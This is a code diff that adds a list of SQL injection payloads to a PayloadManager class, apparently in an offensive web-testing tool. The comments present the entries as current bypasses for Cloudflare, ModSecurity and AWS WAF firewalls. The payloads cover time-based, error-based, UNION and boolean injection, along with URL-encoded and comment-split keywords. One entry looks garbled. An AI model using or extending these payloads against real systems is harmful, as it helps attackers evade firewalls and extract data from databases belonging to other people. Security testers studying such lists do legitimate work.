@@ -341,7 +341,36 @@ class PayloadManager:
                 "' AND 1=1 AND 'b'='b",
                 "' AND 1=1 AND 'c'='c",
                 "' AND 1=1 AND 'd'='d",
-                "' AND 1=1 AND 'e'='e"
+                "' AND 1=1 AND 'e'='e",
+                # 2025 Cutting-Edge WAF Bypass Techniques
+                "' OR '1'='1' AND SLEEP(0)--",
+                "' UNION SELECT NULL,NULL,NULL WHERE 1=SLEEP(0)--",
+                "' AND extractvalue(1,concat(0x7e,version()))--",
+                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
+                "' OR IF(1=1,BENCHMARK(100000,MD5(1)),0)--",
+                "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
+                "' AND (SELECT * FROM (SELECT(SLEEP(0)))x)--",
+                "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64--",
+                "' UNION ALL SELECT NULL,NULL,NULL#",
+                "' OR 1=1 LIMIT 1,1--",
+                # Cloudflare-specific bypasses (2025)
+                "' AND'x'='x",
+                "' AND''='",
+                "' OR''='",
+                "' OR 'x'LIKE'x",
+                "' OR 1--",
+                "' OR 1#",
+                "' OR 1/*",
+                # ModSecurity bypasses (2025)
+                "' /*!12345UNION*/ /*!12345SELECT*/",
+                "' %55%4E%49%4F%4E %53%45%4C%45%43%54",
+                "' un?+??+?ion sel??+?ct",
+                "' %75nion %73elect",
+                # AWS WAF bypasses (2025)
+                "' UNION/**_**/SELECT/**_**/NULL--",
+                "' AND SLEEP(0)AND'1",
+                "' OR 1 RLIKE 1--",
+                "' OR 'a' REGEXP 'a'--"
             ],
             
             # JSON-specific payloads - 2024 Enhanced
